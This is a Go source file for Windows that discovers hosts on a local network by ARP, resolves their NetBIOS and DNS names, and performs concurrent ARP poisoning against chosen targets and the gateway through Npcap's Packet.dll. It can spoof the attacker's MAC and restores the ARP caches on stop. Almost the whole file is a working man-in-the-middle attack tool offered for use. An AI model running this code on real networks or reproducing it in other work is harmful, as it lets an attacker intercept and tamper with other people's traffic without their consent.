package main

import (
	"context"
	"encoding/binary"
	"errors"
	"fmt"
	"net"
	"sort"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"
	"unsafe"
)

const (
	ethTypeARP    = 0x0806
	arpHTYPEEther = 1
	arpPTYPEIPv4  = 0x0800
	arpOpReply    = 2
	etherAddrLen  = 6
	ipv4AddrLen   = 4
)

var (
	iphlpapi            = syscall.NewLazyDLL("iphlpapi.dll")
	procSendARP         = iphlpapi.NewProc("SendARP")
	procGetAdaptersInfo = iphlpapi.NewProc("GetAdaptersInfo")

	packetDLL                 *syscall.LazyDLL
	procPacketGetAdapterNames *syscall.LazyProc
	procPacketOpenAdapter     *syscall.LazyProc
	procPacketCloseAdapter    *syscall.LazyProc
	procPacketAllocatePacket  *syscall.LazyProc
	procPacketInitPacket      *syscall.LazyProc
	procPacketFreePacket      *syscall.LazyProc
	procPacketSendPacket      *syscall.LazyProc
	procPacketSetHwFilter     *syscall.LazyProc
	packetDLLLoaded           bool
)

type Host struct {
	IP   net.IP
	MAC  net.HardwareAddr
	Name string
	Note string
}

type PoisonTarget struct {
	IP   net.IP
	MAC  net.HardwareAddr
	Name string
}

type IfaceInfo struct {
	Name        string
	Description string
	Index       int
	IP          net.IP
	Mask        net.IPMask
	MAC         net.HardwareAddr
	Gateway     net.IP
	PcapName    string
}

type ipAddrString struct {
	Next      *ipAddrString
	IpAddress [16]byte
	IpMask    [16]byte
	Context   uint32
}

type ipAdapterInfo struct {
	Next                *ipAdapterInfo
	ComboIndex          uint32
	AdapterName         [260]byte
	Description         [132]byte
	AddressLength       uint32
	Address             [8]byte
	Index               uint32
	Type                uint32
	DhcpEnabled         uint32
	CurrentIpAddress    uintptr
	IpAddressList       ipAddrString
	GatewayList         ipAddrString
	DhcpServer          ipAddrString
	HaveWins            int32
	PrimaryWinsServer   ipAddrString
	SecondaryWinsServer ipAddrString
	LeaseObtained       int64
	LeaseExpires        int64
}

func cstr(b []byte) string {
	n := 0
	for n < len(b) && b[n] != 0 {
		n++
	}
	return string(b[:n])
}

func loadPacketDLL() error {
	if packetDLLLoaded {
		return nil
	}
	candidates := []string{"Packet.dll", "C:\\Windows\\System32\\Npcap\\Packet.dll", "C:\\Windows\\System32\\Packet.dll"}
	var last error
	for _, path := range candidates {
		dll := syscall.NewLazyDLL(path)
		if err := dll.Load(); err != nil {
			last = err
			continue
		}
		packetDLL = dll
		procPacketGetAdapterNames = dll.NewProc("PacketGetAdapterNames")
		procPacketOpenAdapter = dll.NewProc("PacketOpenAdapter")
		procPacketCloseAdapter = dll.NewProc("PacketCloseAdapter")
		procPacketAllocatePacket = dll.NewProc("PacketAllocatePacket")
		procPacketInitPacket = dll.NewProc("PacketInitPacket")
		procPacketFreePacket = dll.NewProc("PacketFreePacket")
		procPacketSendPacket = dll.NewProc("PacketSendPacket")
		procPacketSetHwFilter = dll.NewProc("PacketSetHwFilter")
		packetDLLLoaded = true
		return nil
	}
	if last == nil {
		last = errors.New("Packet.dll not found")
	}
	return fmt.Errorf("load Packet.dll failed: %w", last)
}

func sendARP(ip net.IP) (net.HardwareAddr, error) {
	ip4 := ip.To4()
	if ip4 == nil {
		return nil, fmt.Errorf("not IPv4: %s", ip)
	}
	dest := binary.LittleEndian.Uint32(ip4)
	var mac [6]byte
	size := uint32(6)
	r, _, err := procSendARP.Call(uintptr(dest), 0, uintptr(unsafe.Pointer(&mac[0])), uintptr(unsafe.Pointer(&size)))
	if r != 0 {
		if err != syscall.Errno(0) {
			return nil, err
		}
		return nil, fmt.Errorf("SendARP failed code=%d", r)
	}
	out := make(net.HardwareAddr, 6)
	copy(out, mac[:])
	return out, nil
}

func listWindowsIfaces() ([]IfaceInfo, error) {
	size := uint32(15000)
	buf := make([]byte, size)
	r, _, err := procGetAdaptersInfo.Call(uintptr(unsafe.Pointer(&buf[0])), uintptr(unsafe.Pointer(&size)))
	if r == 111 {
		buf = make([]byte, size)
		r, _, err = procGetAdaptersInfo.Call(uintptr(unsafe.Pointer(&buf[0])), uintptr(unsafe.Pointer(&size)))
	}
	if r != 0 {
		if err != syscall.Errno(0) {
			return nil, err
		}
		return nil, fmt.Errorf("GetAdaptersInfo failed: %d", r)
	}
	var out []IfaceInfo
	info := (*ipAdapterInfo)(unsafe.Pointer(&buf[0]))
	for info != nil {
		ipStr := cstr(info.IpAddressList.IpAddress[:])
		maskStr := cstr(info.IpAddressList.IpMask[:])
		gwStr := cstr(info.GatewayList.IpAddress[:])
		ip := net.ParseIP(ipStr)
		if ip == nil || ip.IsUnspecified() || ip.To4() == nil {
			info = info.Next
			continue
		}
		mask := net.IPMask(net.ParseIP(maskStr).To4())
		if mask == nil {
			info = info.Next
			continue
		}
		mac := make(net.HardwareAddr, info.AddressLength)
		copy(mac, info.Address[:info.AddressLength])
		item := IfaceInfo{
			Name:        cstr(info.AdapterName[:]),
			Description: cstr(info.Description[:]),
			Index:       int(info.Index),
			IP:          ip.To4(),
			Mask:        mask,
			MAC:         mac,
			Gateway:     net.ParseIP(gwStr),
		}
		if item.Gateway != nil {
			item.Gateway = item.Gateway.To4()
		}
		out = append(out, item)
		info = info.Next
	}
	return out, nil
}

func pcapAdapterNames() ([]string, error) {
	if err := loadPacketDLL(); err != nil {
		return nil, err
	}
	abuf := make([]byte, 16384)
	asize := uint32(len(abuf))
	r, _, err := procPacketGetAdapterNames.Call(uintptr(unsafe.Pointer(&abuf[0])), uintptr(unsafe.Pointer(&asize)))
	if r != 0 {
		names := parseDoubleNullASCII(abuf)
		asciiLike := 0
		for _, n := range names {
			if strings.Contains(strings.ToUpper(n), "NPF") || strings.Contains(n, "\\Device\\") {
				asciiLike++
			}
		}
		if asciiLike > 0 || (len(names) > 0 && strings.Contains(names[0], "\\")) {
			return names, nil
		}
	}
	buf := make([]uint16, 8192)
	size := uint32(len(buf) * 2)
	r2, _, err2 := procPacketGetAdapterNames.Call(uintptr(unsafe.Pointer(&buf[0])), uintptr(unsafe.Pointer(&size)))
	if r2 == 0 {
		if err2 != syscall.Errno(0) {
			return nil, err2
		}
		if err != syscall.Errno(0) {
			return nil, err
		}
		return nil, errors.New("PacketGetAdapterNames failed")
	}
	return parseDoubleNullUTF16(buf), nil
}

func parseDoubleNullASCII(b []byte) []string {
	var out []string
	start := 0
	for i := 0; i < len(b); i++ {
		if b[i] == 0 {
			if i == start {
				break
			}
			out = append(out, string(b[start:i]))
			start = i + 1
		}
	}
	return out
}

func parseDoubleNullUTF16(b []uint16) []string {
	var out []string
	var cur []uint16
	for i := 0; i < len(b); i++ {
		if b[i] == 0 {
			if len(cur) == 0 {
				break
			}
			out = append(out, syscall.UTF16ToString(cur))
			cur = cur[:0]
			continue
		}
		cur = append(cur, b[i])
	}
	return out
}

func npfNameFromGUID(guid string) string {
	g := strings.TrimSpace(guid)
	if g == "" {
		return ""
	}
	if !strings.HasPrefix(g, "{") {
		g = "{" + g + "}"
	}
	return "\\Device\\NPF_" + g
}

func matchPcapName(iface IfaceInfo, names []string) string {
	if built := npfNameFromGUID(iface.Name); built != "" {
		for _, n := range names {
			if strings.EqualFold(n, built) {
				return n
			}
		}
		for _, n := range names {
			if strings.Contains(strings.ToUpper(n), strings.ToUpper(strings.Trim(iface.Name, "{}"))) {
				return n
			}
		}
		return built
	}
	for _, n := range names {
		if strings.Contains(strings.ToUpper(n), "NPF_") {
			return n
		}
	}
	if len(names) > 0 {
		return names[0]
	}
	return ""
}

func fillPcapNames(ifaces []IfaceInfo) []IfaceInfo {
	// 启动时不要调用 PacketGetAdapterNames（可能卡住）。
	// 直接用适配器 GUID 构造 Npcap 名；发包时再按需打开。
	for i := range ifaces {
		ifaces[i].PcapName = npfNameFromGUID(ifaces[i].Name)
	}
	return ifaces
}

func chooseIface(want string) (IfaceInfo, error) {
	ifaces, err := listWindowsIfaces()
	if err != nil {
		return IfaceInfo{}, err
	}
	if len(ifaces) == 0 {
		return IfaceInfo{}, errors.New("no IPv4 adapters")
	}
	ifaces = fillPcapNames(ifaces)
	if want != "" {
		for _, it := range ifaces {
			if strings.EqualFold(it.Name, want) || strings.Contains(strings.ToLower(it.Description), strings.ToLower(want)) || it.IP.String() == want {
				return it, nil
			}
		}
		return IfaceInfo{}, fmt.Errorf("iface not found: %s", want)
	}
	var best *IfaceInfo
	for i := range ifaces {
		it := &ifaces[i]
		if it.Gateway == nil || it.Gateway.IsUnspecified() || it.IP.IsLoopback() {
			continue
		}
		if best == nil || (best.IP[0] != 192 && it.IP[0] == 192) {
			best = it
		}
	}
	if best != nil {
		return *best, nil
	}
	return ifaces[0], nil
}

func cidrHosts(ip net.IP, mask net.IPMask) []net.IP {
	ip4 := ip.To4()
	if ip4 == nil {
		return nil
	}
	network := ip4.Mask(mask)
	ones, bits := mask.Size()
	if bits != 32 {
		return nil
	}
	hostBits := bits - ones
	if hostBits <= 0 {
		return nil
	}
	if hostBits > 16 {
		hostBits = 8
		network = ip4.Mask(net.CIDRMask(24, 32))
	}
	total := 1 << hostBits
	out := make([]net.IP, 0, total)
	base := binary.BigEndian.Uint32(network)
	for i := 0; i < total; i++ {
		v := base + uint32(i)
		b := make(net.IP, 4)
		binary.BigEndian.PutUint32(b, v)
		if hostBits >= 2 && (i == 0 || i == total-1) {
			continue
		}
		out = append(out, b)
	}
	return out
}

func ipToUint32(ip net.IP) (uint32, error) {
	ip4 := ip.To4()
	if ip4 == nil {
		return 0, fmt.Errorf("not IPv4")
	}
	return binary.BigEndian.Uint32(ip4), nil
}

func uint32ToIP(v uint32) net.IP {
	b := make(net.IP, 4)
	binary.BigEndian.PutUint32(b, v)
	return b
}

func parseIPList(spec string) ([]net.IP, error) {
	spec = strings.TrimSpace(spec)
	if spec == "" {
		return nil, errors.New("empty IP list")
	}
	parts := strings.FieldsFunc(spec, func(r rune) bool {
		return r == ',' || r == ';' || r == ' ' || r == '\t' || r == '\n'
	})
	seen := make(map[uint32]struct{})
	var out []net.IP
	for _, p := range parts {
		p = strings.TrimSpace(p)
		if p == "" {
			continue
		}
		if strings.Contains(p, "-") {
			rp := strings.SplitN(p, "-", 2)
			startIP := net.ParseIP(strings.TrimSpace(rp[0]))
			if startIP == nil || startIP.To4() == nil {
				return nil, fmt.Errorf("invalid start: %s", rp[0])
			}
			endStr := strings.TrimSpace(rp[1])
			var endIP net.IP
			if strings.Count(endStr, ".") == 0 {
				base := startIP.To4()
				last, err := strconv.Atoi(endStr)
				if err != nil || last < 0 || last > 255 {
					return nil, fmt.Errorf("invalid end host: %s", endStr)
				}
				endIP = net.IPv4(base[0], base[1], base[2], byte(last))
			} else {
				endIP = net.ParseIP(endStr)
				if endIP == nil || endIP.To4() == nil {
					return nil, fmt.Errorf("invalid end: %s", endStr)
				}
			}
			s, _ := ipToUint32(startIP)
			e, _ := ipToUint32(endIP)
			if e < s {
				return nil, fmt.Errorf("end < start")
			}
			if e-s > 1024 {
				return nil, fmt.Errorf("range too large")
			}
			for v := s; v <= e; v++ {
				if _, ok := seen[v]; ok {
					continue
				}
				seen[v] = struct{}{}
				out = append(out, uint32ToIP(v))
			}
			continue
		}
		ip := net.ParseIP(p)
		if ip == nil || ip.To4() == nil {
			return nil, fmt.Errorf("invalid IP: %s", p)
		}
		v, _ := ipToUint32(ip)
		if _, ok := seen[v]; ok {
			continue
		}
		seen[v] = struct{}{}
		out = append(out, ip.To4())
	}
	if len(out) == 0 {
		return nil, errors.New("no valid IP")
	}
	sort.Slice(out, func(i, j int) bool {
		a, _ := ipToUint32(out[i])
		b, _ := ipToUint32(out[j])
		return a < b
	})
	return out, nil
}

func collectTargets(targetSpec, fromSpec, toSpec string) ([]net.IP, error) {
	var all []net.IP
	if strings.TrimSpace(targetSpec) != "" {
		ips, err := parseIPList(targetSpec)
		if err != nil {
			return nil, err
		}
		all = append(all, ips...)
	}
	if strings.TrimSpace(fromSpec) != "" || strings.TrimSpace(toSpec) != "" {
		if strings.TrimSpace(fromSpec) == "" || strings.TrimSpace(toSpec) == "" {
			return nil, errors.New("from/to both required")
		}
		ips, err := parseIPList(fromSpec + "-" + toSpec)
		if err != nil {
			return nil, err
		}
		all = append(all, ips...)
	}
	if len(all) == 0 {
		return nil, errors.New("no targets")
	}
	seen := map[uint32]struct{}{}
	var out []net.IP
	for _, ip := range all {
		v, err := ipToUint32(ip)
		if err != nil {
			continue
		}
		if _, ok := seen[v]; ok {
			continue
		}
		seen[v] = struct{}{}
		out = append(out, ip.To4())
	}
	sort.Slice(out, func(i, j int) bool {
		a, _ := ipToUint32(out[i])
		b, _ := ipToUint32(out[j])
		return a < b
	})
	return out, nil
}

func reverseDNSName(ip net.IP, timeout time.Duration) string {
	ctx, cancel := context.WithTimeout(context.Background(), timeout)
	defer cancel()
	var r net.Resolver
	names, err := r.LookupAddr(ctx, ip.String())
	if err != nil || len(names) == 0 {
		return ""
	}
	return strings.TrimSuffix(strings.TrimSpace(names[0]), ".")
}

func netbiosName(ip net.IP, timeout time.Duration) string {
	ip4 := ip.To4()
	if ip4 == nil {
		return ""
	}
	conn, err := net.DialTimeout("udp", net.JoinHostPort(ip4.String(), "137"), timeout)
	if err != nil {
		return ""
	}
	defer conn.Close()
	_ = conn.SetDeadline(time.Now().Add(timeout))
	req := []byte{
		0x12, 0x34, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x20,
		0x43, 0x4b, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
		0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
		0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
		0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
		0x00, 0x00, 0x21, 0x00, 0x01,
	}
	if _, err := conn.Write(req); err != nil {
		return ""
	}
	buf := make([]byte, 512)
	n, err := conn.Read(buf)
	if err != nil || n < 57 {
		return ""
	}
	pos := 12
	for pos < n {
		l := int(buf[pos])
		pos++
		if l == 0 {
			break
		}
		pos += l
	}
	pos += 4
	if pos+12 > n {
		return ""
	}
	if buf[pos]&0xC0 == 0xC0 {
		pos += 2
	} else {
		for pos < n {
			l := int(buf[pos])
			pos++
			if l == 0 {
				break
			}
			pos += l
		}
	}
	if pos+10 > n {
		return ""
	}
	rtype := binary.BigEndian.Uint16(buf[pos : pos+2])
	pos += 8
	rdlen := int(binary.BigEndian.Uint16(buf[pos : pos+2]))
	pos += 2
	if rtype != 0x0021 || pos >= n || pos+1 > n {
		return ""
	}
	numNames := int(buf[pos])
	pos++
	var unique, group string
	for i := 0; i < numNames && pos+18 <= n && pos+18 <= pos+rdlen; i++ {
		raw := buf[pos : pos+15]
		nameType := buf[pos+15]
		flags := binary.BigEndian.Uint16(buf[pos+16 : pos+18])
		pos += 18
		name := strings.TrimSpace(string(raw))
		clean := strings.Map(func(r rune) rune {
			if r >= 32 && r < 127 {
				return r
			}
			return -1
		}, name)
		clean = strings.TrimSpace(clean)
		if clean == "" {
			continue
		}
		isGroup := flags&0x8000 != 0
		if !isGroup && (nameType == 0x00 || nameType == 0x20) {
			if unique == "" {
				unique = clean
			}
		} else if isGroup && group == "" {
			group = clean
		}
	}
	if unique != "" {
		return unique
	}
	return group
}

func resolveDeviceName(ip net.IP, timeout time.Duration) string {
	if nb := netbiosName(ip, timeout); nb != "" {
		return nb
	}
	if dns := reverseDNSName(ip, timeout); dns != "" {
		return dns
	}
	return "-"
}

func isZeroMAC(m net.HardwareAddr) bool {
	for _, b := range m {
		if b != 0 {
			return false
		}
	}
	return true
}

func scanLAN(iface IfaceInfo, cidr string, workers int, timeout time.Duration, resolveName bool, nameTimeout time.Duration) ([]Host, error) {
	var targets []net.IP
	if cidr != "" {
		_, ipnet, err := net.ParseCIDR(cidr)
		if err != nil {
			return nil, err
		}
		targets = cidrHosts(ipnet.IP, ipnet.Mask)
	} else {
		targets = cidrHosts(iface.IP, iface.Mask)
	}
	if len(targets) == 0 {
		return nil, errors.New("no scan targets")
	}
	if workers < 1 {
		workers = 64
	}
	if workers > 256 {
		workers = 256
	}
	type result struct {
		h  Host
		ok bool
	}
	jobs := make(chan net.IP, len(targets))
	results := make(chan result, len(targets))
	// 第一阶段：只做 ARP，名称解析放到第二阶段限流，避免界面卡死
	for i := 0; i < workers; i++ {
		go func() {
			for ip := range jobs {
				mac, err := sendARP(ip)
				if err == nil && mac != nil && !isZeroMAC(mac) {
					results <- result{Host{IP: ip, MAC: mac, Name: "-"}, true}
				} else {
					results <- result{}
				}
			}
		}()
	}
	for _, ip := range targets {
		jobs <- ip
	}
	close(jobs)
	var hosts []Host
	for i := 0; i < len(targets); i++ {
		r := <-results
		if r.ok {
			hosts = append(hosts, r.h)
		}
	}
	// 第二阶段：限制并发解析名称
	if resolveName && len(hosts) > 0 {
		nameWorkers := 8
		if nameWorkers > len(hosts) {
			nameWorkers = len(hosts)
		}
		if nameTimeout <= 0 {
			nameTimeout = 300 * time.Millisecond
		}
		sem := make(chan struct{}, nameWorkers)
		var wg sync.WaitGroup
		for i := range hosts {
			wg.Add(1)
			go func(idx int) {
				defer wg.Done()
				sem <- struct{}{}
				defer func() { <-sem }()
				hosts[idx].Name = resolveDeviceName(hosts[idx].IP, nameTimeout)
			}(i)
		}
		wg.Wait()
	}
	sort.Slice(hosts, func(i, j int) bool {
		return binary.BigEndian.Uint32(hosts[i].IP.To4()) < binary.BigEndian.Uint32(hosts[j].IP.To4())
	})
	return hosts, nil
}
func buildARPPacket(dstMAC, srcMAC net.HardwareAddr, op uint16, senderMAC net.HardwareAddr, senderIP net.IP, targetMAC net.HardwareAddr, targetIP net.IP) []byte {
	pkt := make([]byte, 42)
	copy(pkt[0:6], dstMAC)
	copy(pkt[6:12], srcMAC)
	binary.BigEndian.PutUint16(pkt[12:14], ethTypeARP)
	binary.BigEndian.PutUint16(pkt[14:16], arpHTYPEEther)
	binary.BigEndian.PutUint16(pkt[16:18], arpPTYPEIPv4)
	pkt[18] = etherAddrLen
	pkt[19] = ipv4AddrLen
	binary.BigEndian.PutUint16(pkt[20:22], op)
	copy(pkt[22:28], senderMAC)
	copy(pkt[28:32], senderIP.To4())
	if targetMAC == nil {
		targetMAC = net.HardwareAddr{0, 0, 0, 0, 0, 0}
	}
	copy(pkt[32:38], targetMAC)
	copy(pkt[38:42], targetIP.To4())
	return pkt
}

type pcapSender struct {
	adapter uintptr
	mu      sync.Mutex
}

func openPcapSender(pcapName string) (*pcapSender, error) {
	if err := loadPacketDLL(); err != nil {
		return nil, err
	}
	if pcapName == "" {
		return nil, errors.New("empty pcap name")
	}
	candidates := []string{pcapName}
	if strings.Contains(pcapName, "{") && !strings.HasPrefix(strings.ToUpper(pcapName), "\\DEVICE\\NPF_") {
		candidates = append(candidates, npfNameFromGUID(pcapName))
	}
	var last error
	for _, name := range candidates {
		b := append([]byte(name), 0)
		r, _, e := procPacketOpenAdapter.Call(uintptr(unsafe.Pointer(&b[0])))
		if r == 0 {
			namePtr, err := syscall.UTF16PtrFromString(name)
			if err != nil {
				last = err
				continue
			}
			r, _, e = procPacketOpenAdapter.Call(uintptr(unsafe.Pointer(namePtr)))
		}
		if r != 0 {
			procPacketSetHwFilter.Call(r, 0x20)
			return &pcapSender{adapter: r}, nil
		}
		if e != syscall.Errno(0) {
			last = fmt.Errorf("PacketOpenAdapter(%s): %w", name, e)
		} else {
			last = fmt.Errorf("PacketOpenAdapter(%s) failed", name)
		}
	}
	return nil, last
}

func (s *pcapSender) Close() {
	if s == nil {
		return
	}
	s.mu.Lock()
	defer s.mu.Unlock()
	if s.adapter != 0 {
		procPacketCloseAdapter.Call(s.adapter)
		s.adapter = 0
	}
}

func (s *pcapSender) Send(frame []byte) error {
	s.mu.Lock()
	defer s.mu.Unlock()
	if s.adapter == 0 {
		return errors.New("adapter closed")
	}
	pkt, _, err := procPacketAllocatePacket.Call()
	if pkt == 0 {
		if err != syscall.Errno(0) {
			return err
		}
		return errors.New("PacketAllocatePacket failed")
	}
	defer procPacketFreePacket.Call(pkt)
	procPacketInitPacket.Call(pkt, uintptr(unsafe.Pointer(&frame[0])), uintptr(len(frame)))
	r, _, err := procPacketSendPacket.Call(s.adapter, pkt, 1)
	if r == 0 {
		if err != syscall.Errno(0) {
			return fmt.Errorf("PacketSendPacket: %w", err)
		}
		return errors.New("PacketSendPacket failed")
	}
	return nil
}

func resolveHostMAC(ip net.IP) (net.HardwareAddr, error) {
	var last error
	for i := 0; i < 3; i++ {
		mac, err := sendARP(ip)
		if err == nil && mac != nil && !isZeroMAC(mac) {
			return mac, nil
		}
		last = err
		time.Sleep(200 * time.Millisecond)
	}
	if last == nil {
		last = errors.New("mac not found")
	}
	return nil, last
}

func ensurePcapName(iface *IfaceInfo) error {
	if iface.PcapName != "" {
		return nil
	}
	names, err := pcapAdapterNames()
	if err != nil {
		return err
	}
	iface.PcapName = matchPcapName(*iface, names)
	if iface.PcapName == "" {
		return errors.New("cannot map Npcap adapter")
	}
	return nil
}

func resolveTargetsConcurrent(targets []net.IP, localIP, gatewayIP net.IP, workers int, resolveName bool, nameTimeout time.Duration, logfn func(string)) []PoisonTarget {
	if workers < 1 {
		workers = 32
	}
	type item struct {
		t   PoisonTarget
		ok  bool
		msg string
	}
	jobs := make(chan net.IP, len(targets))
	outCh := make(chan item, len(targets))
	var wg sync.WaitGroup
	for i := 0; i < workers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for tip := range jobs {
				if tip.Equal(localIP) {
					outCh <- item{msg: fmt.Sprintf("skip local %s", tip)}
					continue
				}
				if gatewayIP != nil && tip.Equal(gatewayIP) {
					outCh <- item{msg: fmt.Sprintf("skip gateway %s", tip)}
					continue
				}
				mac, err := resolveHostMAC(tip)
				if err != nil {
					outCh <- item{msg: fmt.Sprintf("[-] %s no MAC", tip)}
					continue
				}
				name := "-"
				if resolveName {
					name = resolveDeviceName(tip, nameTimeout)
				}
				outCh <- item{ok: true, t: PoisonTarget{IP: tip.To4(), MAC: mac, Name: name}, msg: fmt.Sprintf("[+] %s %s %s", tip, mac, name)}
			}
		}()
	}
	for _, tip := range targets {
		jobs <- tip
	}
	close(jobs)
	go func() {
		wg.Wait()
		close(outCh)
	}()
	var result []PoisonTarget
	for it := range outCh {
		if logfn != nil && it.msg != "" {
			logfn(it.msg)
		}
		if it.ok {
			result = append(result, it.t)
		}
	}
	sort.Slice(result, func(i, j int) bool {
		a, _ := ipToUint32(result[i].IP)
		b, _ := ipToUint32(result[j].IP)
		return a < b
	})
	return result
}

// poisonLoopConcurrent attacks each target in its own goroutine simultaneously.
func poisonLoopConcurrent(iface IfaceInfo, targets []net.IP, gatewayIP net.IP, interval time.Duration, oneWay bool, fakeMAC net.HardwareAddr, resolveName bool, workers int, stop <-chan struct{}, logfn func(string)) error {
	if len(targets) == 0 {
		return errors.New("no targets")
	}
	if err := ensurePcapName(&iface); err != nil {
		return err
	}
	if logfn == nil {
		logfn = func(s string) { fmt.Println(s) }
	}
	if workers < 1 {
		workers = 32
	}
	gatewayMAC, err := resolveHostMAC(gatewayIP)
	if err != nil {
		return fmt.Errorf("gateway MAC %s: %w", gatewayIP, err)
	}
	logfn(fmt.Sprintf("[*] concurrent resolve %d targets (workers=%d)", len(targets), workers))
	poisonTargets := resolveTargetsConcurrent(targets, iface.IP, gatewayIP, workers, resolveName, 700*time.Millisecond, logfn)
	if len(poisonTargets) == 0 {
		return errors.New("no reachable targets")
	}
	sender, err := openPcapSender(iface.PcapName)
	if err != nil {
		return err
	}
	defer sender.Close()
	attackerMAC := iface.MAC
	if fakeMAC != nil {
		attackerMAC = fakeMAC
	}
	logfn("[*] multi-thread ARP poison ready")
	logfn(fmt.Sprintf("    iface=%s ip=%s", iface.Description, iface.IP))
	logfn(fmt.Sprintf("    gateway=%s/%s spoof=%s targets=%d interval=%s", gatewayIP, gatewayMAC, attackerMAC, len(poisonTargets), interval))

	var wg sync.WaitGroup
	var errOnce sync.Once
	var firstErr error
	var sent atomic.Uint64
	setErr := func(e error) {
		if e != nil {
			errOnce.Do(func() { firstErr = e })
		}
	}
	done := make(chan struct{})
	go func() {
		<-stop
		close(done)
	}()

	for _, t := range poisonTargets {
		t := t
		wg.Add(1)
		go func() {
			defer wg.Done()
			sendOne := func() error {
				p1 := buildARPPacket(t.MAC, attackerMAC, arpOpReply, attackerMAC, gatewayIP, t.MAC, t.IP)
				if err := sender.Send(p1); err != nil {
					return err
				}
				n := uint64(1)
				if !oneWay {
					p2 := buildARPPacket(gatewayMAC, attackerMAC, arpOpReply, attackerMAC, t.IP, gatewayMAC, gatewayIP)
					if err := sender.Send(p2); err != nil {
						return err
					}
					n++
				}
				sent.Add(n)
				return nil
			}
			if err := sendOne(); err != nil {
				setErr(err)
				return
			}
			ticker := time.NewTicker(interval)
			defer ticker.Stop()
			for {
				select {
				case <-done:
					for i := 0; i < 3; i++ {
						r1 := buildARPPacket(t.MAC, gatewayMAC, arpOpReply, gatewayMAC, gatewayIP, t.MAC, t.IP)
						_ = sender.Send(r1)
						if !oneWay {
							r2 := buildARPPacket(gatewayMAC, t.MAC, arpOpReply, t.MAC, t.IP, gatewayMAC, gatewayIP)
							_ = sender.Send(r2)
						}
						time.Sleep(80 * time.Millisecond)
					}
					return
				case <-ticker.C:
					if err := sendOne(); err != nil {
						setErr(err)
						return
					}
				}
			}
		}()
	}

	statusDone := make(chan struct{})
	go func() {
		tk := time.NewTicker(2 * time.Second)
		defer tk.Stop()
		for {
			select {
			case <-done:
				close(statusDone)
				return
			case <-tk.C:
				logfn(fmt.Sprintf("[*] poisoning... targets=%d packets~%d", len(poisonTargets), sent.Load()))
			}
		}
	}()

	<-done
	logfn("[*] stopping workers and restoring ARP...")
	wg.Wait()
	<-statusDone
	logfn("[+] all targets restored")
	return firstErr
}
